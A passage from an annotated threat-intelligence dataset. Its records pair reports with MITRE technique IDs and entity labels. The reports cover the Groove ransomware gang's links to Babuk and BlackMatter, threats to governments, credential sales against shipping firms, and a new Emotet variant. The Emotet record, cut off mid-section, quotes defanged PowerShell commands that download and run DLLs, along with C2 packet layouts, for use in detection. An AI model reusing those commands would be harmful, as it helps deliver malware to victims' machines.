*reasonable* *individuals.*\n>\n> *Oh yeah, you've unexpectedly reminded everyone about the wonderful RAMP forum.\nAre the handles* ***Orange*** *and* ***Darkside** *still free?**\nThe name Darkside might sound more familiar than Orange but, as we saw with the naming of RAMP, TetyaSluha is one for cybercrime sentiment, so there is almost certainly some hidden meaning behind it.\nBased on ATR's previous research, we believe the name Orange was chosen as a tribute to REvil/GandCrab.\nPeople familiar with those campaigns have likely heard of the actor \u2018[UNKN](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-atr-analyzes-sodinokibi-aka-revil-ransomware-as-a-service-the-all-stars/)\u2019.\nHowever, there was a less well known REvil affiliate admin named Orange.\nA tribute seems fitting here as these successful ransomware families, GandCrab and REvil, shaped the RaaS ecosystem as we know it today.\nIn the past, UNKN was [linked](https://krebsonsecurity.com/2020/05/this-service-helps-malware-authors-fix-flaws-in-their-code/) to several other monikers, however Orange was hardly mentioned since there wasn\u2019t a matching public handle used on any particular cybercrime forum.\nHowever, REvil insiders will recognize the name Orange as one of their admins.\nBased on ATR\u2019s closed-source underground research, we believe with a high level of confidence, that UNKN was indeed linked to the aforementioned accounts, as well as the infamous \u201cCrab\u201d handle used by GandCrab.\nCrab was one of the two affiliate-facing accounts that the GandCrab team had (The other being Funnycrab).\nWe believe with a high level of confidence that after the closure of GandCrab, the individual behind the Funnycrab account changed to the account name to Orange and continued operations with REvil, with only a subset of skilled GandCrab affiliates, (as described in this Virus Bulletin 2019 [whitepaper](https://www.virusbulletin.com/blog/2019/11/vb2019-paper-different-ways-cook-crab-gandcrab-ransomware-service-raas-analysed-depth/)) since GandCrab grew too big and needed to shed some weight.\n### Groove Gang\nIn the post from Figure 5, \u201cOrange\u201d also claims to have always had a small group of people that the group collaborates with.\nAdditionally, the actor claims that the name has not been mentioned in the media before, comparing the group to the Israeli secret service group Mossad.\nThe group\u2019s comparison to Mossad is extremely doubtful at best, given the drama that has publicly played out.\nGroove claims several of Babuk\u2019s victims, including the Metropolitan Police Department, brought them a lot of attention.\nThe several mentions to Babuk isn\u2019t by mistake: we have evidence the two groups also have connections, which we\u2019ve pieced together from examining the behavior of \u2014 and particularly the fallout between \u2014 the two groups.\n### Babuk's Fallout\nOriginally, the Babuk gang paid affiliates by each victim they attacked.\nYet on April 30, it was [reported](https://www.bleepingcomputer.com/news/security/babuk-quits-ransomware-encryption-focuses-on-data-theft-extortion/) that the gang suddenly had stopped working with affiliates, including the act of encrypting a victim\u2019s system.\nInstead, their focus shifted to data exfiltration and extortion of targeted organizations.\nThat was followed by the group [releasing](https://www.bleepingcomputer.com/news/security/babuk-ransomware-is-back-uses-new-version-on-corporate-networks/) the builder for the old versions of its ransomware as it pivoted to a new one for themselves.\nThe attention that Babuk drew by hacking and extorting the Metropolitan Police Department meant their brand name became widely known.\nIt also meant that more firms and agencies were interested in finding out who was behind it.\nThis kind of heat is unwanted by most gangs, as any loose ends that are out there can come back to bite them.\nThen, on Sept. 3, the threat actor with the handle \u2018dyadka0220\u2019 stated that they were the principal developer of Babuk ransomware and posted what they claimed was the Babuk ransomware source code.\nThey claimed the reason they were sharing everything was due to being terminally ill with lung cancer.\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-6.png)Dyadka0220 was possibly the developer that Orange hinted at in the RAMP posting pictured above.\nOn Sept. 7, the Groove gang responded with a blog on their own website, titled \u201cThoughts about the meaning,\u201d which rhymes in Russian.\nIn this blog, the gang (allegedly) provides information on several recent happenings.\nPer their statement, the illness of \u2018dyadka0220\u2019 is a lie.\nAdditionally, their response alleges that the Groove gang never created the Babuk ransomware themselves, but worked with someone else to produce it.\nThe validity of the claims in Groove\u2019s latest blog is hard to determine, although this does not matter too much: the Babuk group, including affiliates, had a fallout that caused the group to break up, causing the retaliation of several (ex-)members.\n### Observed Behavior\nThe ATR team has covered Babuk multiple times.\nThe [first](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/babuk-ransomware/) blog, published last February, covers the initial observations of the group\u2019s malware.\nThe [second](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/babuk-biting-off-more-than-they-could-chew-by-aiming-to-encrypt-vm-and-nix-systems/) blog, published last July, dives into the ESXi version of the ransomware and its issues.\nThe group\u2019s tactics, techniques, and procedures (TTPs) are in-line with commonly observed techniques from ransomware actors.\nThe deployment of dual-use tools, which can be used for both benign and malicious purposes, is difficult to defend against, as intent is an unknown term for a machine.\nTogether with other vendors we have narrowed down some of the TTPs observed by the Groove gang.\n### Initial Access\nThe actor needs to get a foothold within the targeted environment.\nThe access can be bought, in terms of stolen (yet valid) credentials, or direct access in the form of a live backdoor on one or more of the victim\u2019s systems.\nAlternatively, the actor can exploit publicly facing infrastructure using a known or unknown exploit.\nTo ATR\u2019s understanding, the latter has been used several times by exploiting vulnerable VPN servers.\n### Lateral Movement, Discovery and Privilege Escalation\nMoving around within the network is an important step for the actor, for two reasons.\nFirstly, it allows the attacker to find as much data as possible, which is then exfiltrated.\nSecondly, access to all machines is required in order to deploy the ransomware at a later stage.\nBy encrypting numerous devices at once, it becomes even harder to control the damage from a defender\u2019s point of view.\nThe actor uses commonly known tools, such as [Ad-Find](https://www.joeware.net/freetools/tools/adfind/) and [NetScan](https://www.netscantools.com/index.html), to gather information on the network.\nBased on the gathered information, the actor will move laterally through the network.\nOne of the most frequently observed methods by this actor to do so, is by using RDP.\nTo work with more than user-level privileges, the actor has a variety of options to escalate their privilege to a domain administrator.\nBrute forcing RDP accounts, the dumping of credentials, and the use of *legacy* exploits such as EternalBlue (CVE-2017-0144), are ways to quickly obtain access to one or more privileged accounts.\nOnce access to these systems is established, the next phase of the attack begins.\n### Data Exfiltration and Ransomware Deployment\nThe actor navigates through the machines on the network using the earlier obtained access.\nTo exfiltrate the collected data, the attacker uses [WinSCP](https://winscp.net/eng/index.php).\nNote that other, similar, tools can also be used.\nOnce all relevant data has been stolen, the attacker will execute the ransomware in bulk.\nThis can be done in a variety of ways, ranging from manually starting the ransomware on the targeted machines, scheduling a task per machine, or using [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) to launch the ransomware.\n### Linking Groove to Babuk and BlackMatter\nAs discussed above, there was a fallout within Babuk.\nFrom that fallout, a part of the group stayed together to form Groove.\nThe server that Babuk used, which we will refer to as the \u201cwyyad\u201d server due to the ending of the onion URL, rebranded in late August 2021.\nThe similarities can be seen in the two screenshots below.\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-7\\_1.png)\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-7\\_2.png)\nThe changes to the landing page from Babuk to Groove\nAside from this, data from old Babuk victims is still hosted on this server.\nThe ATR team found, among others, leaks that belong to:\n* a major U.S. sports team,\n* a British IT service provider,\n* an Italian pharmaceutical company,\n* a major US police department,\n* a US based interior shop.\nAll these victims have previously been claimed by (and attributed to) Babuk.\nAnother gang, known as BlackMatter, uses a variety of locations to host their extorted files, which can be done out of convenience or to avoid a single notice and takedown to remove all offending files.\nAdditionally, the ATR team assumes, with medium confidence, that different affiliates use different hosting locations.\nThe data of one of the BlackMatter gang\u2019s victims, a Thai IT service provider, is stored on the \u201cwyyad\u201d server.\nAs such, it can mean that the Groove gang worked as an affiliate for the BlackMatter gang.\nThis is in line with their claim to work with anybody, as long as they profit from it.\nThe image below shows the BlackMatter leak website linking to the \u201cwyyad\u201d server.\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-8.png)\nScreenshot of BlackMatter, where the data is stored on the Groove server\nThe Groove gang\u2019s website contains, at the time of writing, a single leak: data from a German printing company.\nEven though the website is accessible via a different address, the leaked data is stored on the \u201cwyyad\u201d server.\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-9.png)\nAnother Groove victim but stored on their own page\nThe affected company does not meet BlackMatter\u2019s \u201crequirements,\u201d the group has said it only goes after companies that make more than $US 100 million.\nThis company\u2019s annual revenue is estimated at $US 75 million, as seen in the below screenshot.\n![](https://d39ec1uo9ktrut.cloudfront.net/Figure-10.png)\nPosting on the Exploit forum by BlackMatter\nAt the end of Orange\u2019s announcement comes a call to action and collaboration: \u201cGROOVE is first and foremost an aggressive financially motivated criminal organization dealing in industrial espionage for about two years.\nRANSOMWARE is no more than an additional source of income.\nWe don\u2019t care who we work with and how.\nYou\u2019ve got money.\nWe\u2019re in.\nThe group\u2019s primary goal, making money, is not limited to ransomware.\nInversely, ransomware would be the cherry on top.\nThis is yet another indication of the ransomware group\u2019s shift to a less hierarchical set-up and a more fluid and opportunistic network-based way of working.\nIn the Groove Gang\u2019s blog on September 7, a reference is made with regards to BlackMatter, and its links to DarkSide.\nIf true, these insights show that the Groove gang has insider knowledge of the BlackMatter gang.\nThis makes the collaboration between Groove and BlackMatter more likely.\nIf these claims are false, it makes one wonder as to why the Groove gang felt the need to talk about other gangs, since they seem to want to make a name for themselves.\nDue to the above outlined actions ATR believes, with high confidence, that Groove is a former affiliate or subgroup of the Babuk gang, who are willing to collaborate with other parties, as long as there's financial gain for them.\nThus, an affiliation with the BlackMatter gang is likely.\n### Conclusion\nEver since Ransomware-as-a-Service became a viable, and highly profitable, business model for cybercriminals, it has operated in much the same way with affiliates being the sometimes underpaid workhorses at the bottom of a rigid pyramid shaped hierarchy.\nFor some affiliates there was an opportunity to become competent cybercriminals while, for many others, the lack of recompense and appreciation for their efforts led to ill-feeling.\nCombined with underground forums banning ransomware actors, this created the perfect opportunity for the threat actor known as Orange to emerge, with the Groove gang in tow, with the offer of new ways of working where an associate\u2019s worth was based entirely on their ability to earn money.\nTime will tell if this approach enhances the reputation of the Groove gang to the level of the cybercriminals they seem to admire.\nOne thing is clear though; with the manifestation of more self-reliant cybercrime groups the power balance within the RaaS ecosystem will change from he who controls the ransomware to he who controls the victim's networks.\n### MITRE TTPs\nWe have compiled a list of TTPs based on older Babuk cases and some recent cases linked to Groove:\n* T1190: Exploit Public-Facing Application (VPN services)\n* T1003: OS Credential Dumping\n* T1078.002: Valid Accounts: Domain Accounts\n* T1059: Command and Scripting Interpreter\n* T1021:002: SMB/Windows Admin Shares\n* T1210: Exploitation of Remote Services\n* T1087: Account Discovery\n* T1482: Domain Trust Discovery\n* T1562: Impair Defense\n* T1537: Transfer Data to Cloud Account\n* T1567: Exfiltration Over Web Service\nIf a partnership is achieved with a Ransomware family:\n* T1486 Data Encrypted for Impact", "mitre_ids": ["T1486", "TA0011", "T1486", "T1486", "T1486", "T1189", "T1589", "S0496", "T1486", "T1486", "T1486", "T1486", "T1486", "S0575", "S0575", "S0154", "S0575", "T1486", "T1486", "T1486", "T1486", "T1486", "S0638", "T1195", "S0638", "T1486", "S0638", "T1486", "T1486", "T1486", "S0638", "T1486", "S0638", "T1486", "S0496", "S0496", "T1486", "S0496", "T1486", "S0496", "S0496", "S0638", "S0638", "TA0010", "T1486", "S0638", "S0638", "S0638", "S0638", "S0638", "T1486", "T1486", "TA0001", "TA0006", "T1190", "T1190", "TA0008", "TA0007", "TA0004", "T1135", "TA0010", "TA0009", "T1486", "TA0008", "T1486", "T1486", "S0552", "T1046", "TA0008", "TA0004", "T1110", "T1003", "T1068", "TA0010", "T1486", "TA0008", "TA0010", "T1486", "TA0010", "T1486", "T1486", "T1053", "S0029", "T1486", "T1486", "T1486", "S0638", "S0638", "S0638", "S0638", "S0638", "S0638", "T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "S0638", "T1190", "T1003", "T1078", "T1059", "T1021", "T1210", "T1087", "T1482", "T1562", "T1537", "T1567"], "anno_name_label": [["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "BabukGang"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "BabukGang"], ["MALWARE", "DarkSide"], ["MALWARE", "GandCrab"], ["MALWARE", "GandCrab"], ["MALWARE", "GandCrab"], ["MALWARE", "GandCrab"], ["MALWARE", "GandCrab"], ["MALWARE", "GandCrab"], ["MALWARE", "GandCrab"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "BabukGang"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "BabukGang"], ["GROUP", "GrooveGang"], ["TOOL", "WinSCP"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "BlackMatter"], ["GROUP", "BlackMatter"], ["GROUP", "GrooveGang"], ["GROUP", "BlackMatter"], ["GROUP", "BlackMatter"], ["GROUP", "BlackMatter"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "BlackMatter"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "DarkSide"], ["GROUP", "GrooveGang"], ["GROUP", "BlackMatter"], ["GROUP", "GrooveGang"], ["GROUP", "BlackMatter"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "BabukGang"], ["GROUP", "BlackMatter"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"], ["GROUP", "GrooveGang"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "The public sector is a juicy target for cybercriminals\nSep 30, 2021\nThe public sector is an extremely high-value target for cybercrime due to the wealth of valuable information it possesses, such as PII and confidential and sensitive documents.\nIntel 471 has observed government-run systems being exploited in multiple ways for both financial gain or in politically motivated cyberattacks.\nBy analyzing and distinguishing the common threats and underlying threat actor motivations, we identified how actor\u2019s intentions can give hints on what government organizations threat actors like to target.\nWhile attacks on national or international institutions tend to earn the most attention, Intel 471 has observed a greater number of compromises in government institutions at the regional, local and municipal level.\nBelow is an overview of the common threats we have identified.\n### **Ransomware attacks**\nRansomware and RaaS groups have plagued organizations across different industry vectors.\nGovernment entities are no different.\nFrom January 2021 to August 2021, we observed about 50 possible breach events for international government, national and regional governments that were ransomware-related, with about half of those incidents tied to RaaS programs.\nBelow is a graph that tallies the attacks and the RaaS affiliates tied to them:\n![](https://lh5.googleusercontent.com/8H7kJzvdlCu6g5EeWxRyvr0kw2eL1n9PG7X24yHUu1zciDmVVokUP41oAaRoPGr1pKj6IK\\_dbPRTymb5r8HTEUIxQ5rNkmj\\_y4nyia1OemRIYq421ncZP4yoRYaB\\_2tCjTS8ALjb=s0)\nThe most attack of the measured time period was the DarkSide ransomware attack against Colonial Pipeline in May 2021.\nThat attack drew heavy attention to the impact these services could have on government organizations and supply chains.\nAs a result of the attention gained from this event, Intel 471 observed RaaS groups adjust their operations, which included new regulations on operators or affiliates targeting government entities.\nOperators of several RaaS programs retreated from additional public focus, opting to maintain a low profile and prohibited their affiliates from targeting government organizations.\nThese changes were short lived: by June 2021 the REvil RaaS operators lifted previous bans and promised additional benefits to affiliates who were willing to attack any U.S.-based company or organization, which likely included government entities.\n### **Social Engineering**\nFrom January 2021 to August 2021, Intel 471 observed multiple social engineering tactics used against the government sectors including call centers, which allowed scammers to leverage multilingual threat actors to defeat and bypass phone-based anti-fraud measures.Threat actors typically fueled call centers with an array of compromised PII that could be used to answer challenge questions such as date of birth, national identification numbers and more.\nOperators at call centers then could impersonate an account holder and manipulate employees to perform authorized account activity, approve transactions, open new accounts and transfer funds\nAdditionally, we observed increased sophistication in phishing pages over the same time period.\nParticularly, pages designed to look like COVID-19 pandemic relief programs from several different countries were discovered, ranging from debt forgiveness to tax payments.\n### **Vulnerabilities**\nIntel 471 has observed three particular vulnerability types used as initial access vectors to compromise public sector networks: remote code execution (RCE), structured query language-injection (SQLi) and cross-site scripting (XSS).\nThese methods, which were used to gain initial access, were observed in breach events conducted by individual threat actors and RaaS operators.\nIn March 2021, an Italian-linked actor claimed on a popular cybercrime forum that they obtained access to a VMware ESXi cloud virtualization server that would grant someone access to municipalities in Eastern Europe.\nIn April 2021, we observed another actor offer to sell information about an SQLi vulnerability allegedly impacting resources belonging to a U.S.-based government entity in Colorado.\nAlso in April, an actor was advertising a compromised database stolen from a city in Turkey, allegedly containing about 1 million records including names, passwords, permissions, phone numbers, user IDs and usernames.\n### **Looking Ahead**\nGovernment entities at all levels should remain vigilant in order to defend against the aforementioned threats as cybercriminals continue to improve and refine their TTPs.\nThe public sector will need to improve their defensive and detection capabilities, shifting from individual indicators of compromise (IoCs) to proactive threat intelligence that offers insight and visibility into key trends in the cybercrime underground.\nIntel 471's range of intelligence products can help security teams defend against threats and mitigate risks from the underground.\nOur Adversary Intelligence provides security teams with visibility into the cybercrime underground, including insight into actor TTPs, motivations and operations.\nUsers also can monitor for compromised credentials proactively via Intel 471's Credential Intelligence service, track weaponized malware via our Malware Intelligence and determine patch prioritization of vulnerabilities via our Vulnerability Dashboard.\n[![Intel 471 Periscope Newsletter](https://no-cache.hubspot.com/cta/default/8813571/4fc6dfd2-c5df-4a7a-9cec-c81feb7ef387.png)](https://cta-redirect.hubspot.com/cta/redirect/8813571/4fc6dfd2-c5df-4a7a-9cec-c81feb7ef387)", "mitre_ids": ["T1486", "T1486", "T1486", "T1486", "T1486", "T1486", "S0496", "T1486", "T1566", "TA0001", "T1190", "T1190", "T1189", "TA0001", "T1486", "T1195", "T1190"], "anno_name_label": [["GROUP", "DarkSide"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CI"]}, {"cti_report": "Cybercrime underground flush with shipping companies\u2019 credentials\nNov 02, 2021\nOne of the lingering impacts of the COVID-19 pandemic is the havoc it has wreaked on the global supply chain.\nThere have been [extreme fluctuations](https://www.cnbc.com/2021/10/25/economists-expect-shipping-problems-to-linger-well-into-2022.html) in the availability of goods, ports around the world are [severely backlogged](https://www.cbsnews.com/news/supply-chain-issues-us-ports-backlog-holiday-shopping/) with full containers, and shipping and logistics companies are [having trouble finding workers](https://www.bloomberg.com/news/articles/2021-08-02/a-trucking-crisis-has-the-u-s-looking-for-more-drivers-abroad) to transport cargo.\nIt is a precarious situation for this sector, especially as the holiday season approaches.\nWith things as volatile as they are, a cybersecurity crisis at one of these logistics and shipping companies could have a calamitous impact on the global consumer economy.\nOver the past few months, Intel 471 has observed network access brokers selling credentials or other forms of access to shipping and logistics companies on the cybercrime underground.\nThese companies operate air, ground and maritime cargo transport on several continents that are responsible for moving billions of dollars worth of goods around the world.\nThe actors responsible for selling these credentials range from newcomers to the most prolific network access brokers that Intel 471 tracks.\nThese actors have obtained these credentials by leveraging well-known vulnerabilities in remote access solutions like Remote Desktop Protocol (RDP), VPN, Citrix, and SonicWall, among others.\nAmong the advertisements observed by Intel 471:\n* **Within the span of two weeks in July 2021**, one new actor and one well-known access broker claimed to have access to a network owned by a Japanese container transportation and shipping company.\nThe new actor included the company\u2019s credentials in a dump of approximately 50 companies, allegedly all obtained via compromised Citrix, Cisco, virtual private network (VPN) and/or remote desktop protocol (RDP) accounts.\nThe well-known actor claimed to have access to several accounts belonging to the company, but did not reveal how they were obtained.\n* **In August 2021**, one actor known to work with groups that have deployed Conti ransomware claimed access to corporate networks belonging to a U.S.-based transportation management and trucking software supplier and a U.S.-based commodity transportation services company.\nThe actor gave the group access to an undisclosed botnet powered by malware that included a virtual network computing (VNC) function.\nThe group used the botnet to download and execute a Cobalt Strike beacon on infected machines, so group members in charge of breaching computer networks received access directly via a Cobalt Strike beacon session.\n* **In September 2021**, an actor with ties to the FiveHands ransomware group claimed access to hundreds of companies, including a U.K.-based logistics company.\nIt\u2019s most likely that access was obtained through a SonicWall vulnerability, given that FiveHands is known to use that access to [launch its ransomware attacks](https://www.bleepingcomputer.com/news/security/new-ransomware-group-uses-sonicwall-zero-day-to-breach-networks/).\nAdditionally in September, a new actor claimed to have gained access to a Bangladesh-based shipping and logistics company through a vulnerability in the PulseSecure VPN.\n* **In October 2021**, a newcomer to a well-known cybercrime forum claimed access to the network of a U.S.-based freight forwarding company, alleging that he had had local administrator rights and could access 20 computers on the company\u2019s network.\nThe actor claimed he obtained the credentials through a path traversal vulnerability in Fortinet\u2019s FortiGate secure sockets layer (SSL) VPN web portal (CVE-2018-13379).\nAlso in October, a newcomer on a different well-known cybercrime forum claimed access to a Malaysian logistics company.\nThose credentials were part of a package that the actor was selling for $5,000.\nIt was unknown how he allegedly obtained those credentials.\nThe world has previously seen the economic damage that can come from a cyber attack on the shipping and logistics industry.\nThe NotPetya attack in 2017 devastated Danish shipping and maritime giant Maersk, [shutting down several of its ports](https://losangeles.cbslocal.com/2017/06/28/la-port-terminal-still-closed/) and costing the company $300 million to replace systems damaged by the malware.\nAdam Banks, head of technology at Maersk, told [a business publication in 2019](https://www.i-cio.com/management/insight/item/maersk-springing-back-from-a-catastrophic-cyber-attack) that \u201cthere was 100 [percent] destruction of anything based on Microsoft that was attached to the network.\nWe have seen attackers try to go after ports this year.\nIn August, suspected foreign government-backed hackers [breached a computer network](https://www.cnn.com/2021/09/23/politics/suspected-foreign-hack-houston/index.html) at the Port of Houston, one of the largest ports on the U.S. Gulf Coast.\nHowever, early detection of the incident thwarted any attempts to impede business operations.\nThose two incidents show that the logistics industry is constantly targeted, and the ramifications of a cyberattack can have a crippling ripple effect on the global economy.\nAt a time when this sector is struggling to keep things operating, a successful attack could bring this industry to a screeching halt, resulting in unforeseen dire consequences for every part of the consumer economy.\nIt's extremely beneficial that security teams in the shipping industry monitor and track adversaries, their tools and malicious behavior to stop attacks from these criminals.\nProactively addressing vulnerabilities in times of high alert avoids further stress on already constrained business operations.", "mitre_ids": ["T1212", "T1021", "T1021", "S0575", "T1486", "S0154", "S0154", "TA0002", "TA0001", "S0618", "T1486", "S0618", "T1486", "T1190", "T1190", "T1212", "S0368"], "anno_name_label": [], "cti_entity_class": ["CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE"]}, {"cti_report": "How the new Emotet differs from previous versions\nDec 09, 2021\nLast month, Intel 471 observed the emergence of Emotet, a notorious strain of malware that had been dormant for most of 2021 after law enforcement agencies [forced it offline](https://intel471.com/blog/emotet-takedown-2021).\nWe wrote in January that \u201cOnly time will tell if the takedown will have a long-term impact on Emotet operations.\nThe groups who run these botnets are sophisticated and resilient, and will most likely have some sort of inherent recovery in place.\nWhile it took months to do, it looks like those behind Emotet have recovered.\nOur initial analysis found some similarities between the new version and what was previously used.\nHowever, given further examination, we have found distinct differences, including the encryption used for communication, additional commands and reconfigurations in several pieces of the communication protocol.\nFurther investigation into Emotet\u2019s keys and IP buffers also revealed two separate botnets are being used to distribute the malware.\nBy searching for these differences, security teams can fine-tune their defenses to make sure this new version can be detected.\n**What we already knew**\nEmotet is a loader-focused, modular malware family that can steal credentials and emails, while also allowing users to send spam from infected users.\nThe modules we observed included:\n* A SPAM module\n* Email credential stealer\n* Outlook email address harvester\n* Browser credential stealer\n* Web-injector\n* A module that allowed for brute-forcing credentials and lateral movement\nIn the short time that the malware has been active, Emotet has been heavily used to push malspam.\nWhile Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.\nEmotet emails are fairly simple, consisting of an attached compressed (.zip) file and password used to open the file.\n![Image 1 email lure]()\nThe image depicts an Emotet email lure.\nWhile the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting.\nThe encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader.\nUpon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states \u201cTHIS DOCUMENT IS PROTECTED,\u201d and instructs victims on how to enable macros.\n![Image 2 the lure]()\nThe image depicts an Emotet document lure.\nEnabling macros will allow the document to spawn PowerShell and attempt to download and execute the Emotet loader.\nThe document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.\nThe document uses the following commands to spawn PowerShell and attempt to download and execute the malware:\n* ```\n\"C:\\Windows\\System32\\cmd[.]exe\" /c start /B powershell $dfkj=\"$strs=\\\"\".Split(\\\",\\\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\\\"c:\\programdata\\\\\\\"+$r1+\\\"[.]dll\\\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\\\"c:\\windows\\syswow64\\rundll32[.]exe\\\";$a=$tpth+\\\",f\\\"+$r2;Start-Process $fp -ArgumentList $a;break;}};\";IEX $dfkj\n```\n* ```\npowershell $dfkj=\"$strs=\\\"\".Split(\\\",\\\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\\\"c:\\programdata\\\\\\\"+$r1+\\\"[.]dll\\\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\\\"c:\\windows\\syswow64\\rundll32[.]exe\\\";$a=$tpth+\\\",f\\\"+$r2;Start-Process $fp -ArgumentList $a;break;}};\";IEX $dfkj\n```\n* ```\n\"C:\\windows\\syswow64\\rundll32[.]exe\" c:\\programdata\\219183368[.]dll,f920683129\n```\nDefenders should look for Microsoft Word or Excel sheets that spawn `CMD -> PowerShell -> rundll32[.]exe` to identify Emotet activity.\n**What we learned**\nMany parts of the bot are identical to the version of Emotet that was active prior to the takedown, particularly the dynamic-link library (DLL).\nEmotet depends on `rundll32[.]exe` to execute, using the exported function \u201cControl\\\\_RunDLL\u201d as the main starting function.\nWhile the loader uses a fairly intensive code flattening/state machine obfuscator, YARA rules created from a few key Emotet algorithms indicate the loader is based on code dated from December 2020 to January 2021.\nDespite previous versions of code being recycled, there are differences in the loader that set it apart from Emotet\u2019s past.\nThe old Emotet used an onboard public Rivest-Shamir-Adleman (RSA) key to encrypt the advanced encryption standard (AES) key used to encrypt all network traffic, as is typical for asymmetric encryption.\nThis public key also is used during communication validation by hashing the data to check that it has not been modified.\nThe new Emotet uses Elliptic Curve Cryptography (ECC) for asymmetric encryption, leveraging an onboard elliptic-curve Diffie-Hellman (ECDH) public key for encryption and an onboard elliptic-curve Digital Signature Algorithm (ECDSA) public key for data validation.\nThese encryption keys are used to identify the Emotet botnets researchers are calling Epoch4 and Epoch5.\n**Protocol changes**\nIn addition to the changes to Emotet\u2019s cryptography, the communication protocol also saw some changes to each of the three \u201clayers\u201d necessary for communication.\nLayer 1 (L1) contains the plaintext data sent to the command and control (C2).\nLayer 2 (L2) contains the client command operation code (opcode) sent by the victim and a SHA-256 hash of L1.\nLayer 3 (L3) is the encrypted data and contains the encrypted AES key, the encrypted data and some randomly generated data as padding.\n**Protocol changes: L1**\nThe old Emotet also used a multilayer communication protocol for all communication performed by the infected victim and the C2.\nHowever, the old protocol required the loader to also enumerate the victim\u2019s process list, which was sent to the C2 during check-in.\nNew Emotet strips out this process checking functionality from initial check-in and places it into a new module focused on process list checking.\nThe following structure was observed for the new Emotet initial check-in:\n```\nstruct layer\\\\_1\\\\_packet\n{\nuint32\\\\_t victim\\\\_id\\\\_size;\nuint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number\nuint32\\\\_t path\\\\_name\\\\_hash;\nuint32\\\\_t protocol\\\\_version; // 0x13465AA or 20211114 in decimal\nuint32\\\\_t loader\\\\_version; // 0x2710\nuint32\\\\_t system\\\\_info;\nuint32\\\\_t session\\\\_id;\nuint32\\\\_t module\\\\_id\\\\_array\\\\_size;\nuint8\\\\_t module\\\\_id\\\\_array[module\\\\_id\\\\_array\\\\_size]; //if module\\\\_id\\\\_array\\\\_size is 0, this field is not included\n}\n```\nThis structure can also be observed in the image below:\n![Image 3 proto format]()\nThe image depicts the structure for Emotet's initial check-in.\nA new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot\u2019s initial check-in.\nThis module exclusively grabs the infected victim\u2019s process list, which is sent back to the C2 using the following L1:\n```\nstruct layer\\\\_1\\\\_packet\n{\nuint32\\\\_t module\\\\_id; //0x2 or 2 in decimal\nuint32\\\\_t module\\\\_job\\\\_id;\nuint32\\\\_t victim\\\\_id\\\\_size;\nuint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number\nuint32\\\\_t process\\\\_name\\\\_buffer\\\\_size;\nuint8\\\\_t process\\\\_name\\\\_buffer[process\\\\_name\\\\_buffer\\\\_size]; //separated by commas\n}\n```\nEmotet no longer delivers any modules until the process list module has been received successfully and the C2 has received the process list from the bot.\nAdditionally, the module\\\\_id and module\\\\_job\\\\_id no longer are stored inside the module itself, but instead are stored in the command buffer received from the C2.\n**Protocol Changes: L2**\nL2 